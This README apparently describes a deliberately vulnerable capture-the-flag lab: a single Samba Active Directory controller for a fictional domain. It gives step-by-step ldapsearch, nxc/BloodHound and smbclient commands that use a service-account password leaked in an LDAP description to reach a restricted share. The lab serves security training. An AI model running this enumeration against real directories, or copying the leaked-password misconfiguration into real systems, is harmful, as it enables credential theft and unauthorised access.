# LDAP / BloodHound Enumeration (Active Directory)

A single-container Active Directory lab built with [Isoloom](https://www.isoloom.com):
[`isoloom.yml`](isoloom.yml) describes one Samba Domain Controller for the realm
**NORTH.SEVENKINGDOMS.LOCAL** — no Windows VMs. It provisions a low-privilege foothold user
(`hodor`), a service account (`svc_backup`) whose LDAP `description` leaks its own password, a
nested group chain (`svc_backup` → **IT Backup** → **Vault Readers**), and a `vault` share only
**Vault Readers** may read.

| Machine | Service |
| --- | --- |
| dc | Samba AD DC: DNS 53, Kerberos 88, LDAP 389/636, SMB 445, kpasswd 464, GC 3268 |

## The attack

1. From `hodor` / `Hodor123!`, bind over a plain LDAP simple bind and enumerate the directory:
   `ldapsearch -x -H ldap://<dc> -D 'hodor@north.sevenkingdoms.local' -w 'Hodor123!' -b 'DC=north,DC=sevenkingdoms,DC=local' '(objectClass=user)' sAMAccountName description memberOf`
   → `svc_backup` carries its own password in its `description` attribute.
2. Map the group paths (`nxc ldap <dc> -u hodor -p 'Hodor123!' --bloodhound --collection All`,
   or follow `memberOf` by hand): `svc_backup` → **IT Backup** → **Vault Readers**.
3. The `vault` share is restricted to **Vault Readers**.
4. Read the flag: `smbclient //dc/vault -U 'NORTH\svc_backup%<leaked>' -c 'get flag.txt'`.

`hodor` is in none of those groups, so the flag is reachable only after the enumeration reveals
both the leaked credential and the nested group path.

## Run it

```bash
isoloom generate
isothrum up . --target docker
isothrum check . --target docker
isothrum down . --target docker
```

The same spec also runs on a local VM, a cloud VM, or Kubernetes targets that Isoloom supports.
This environment is deliberately vulnerable: keep it isolated.
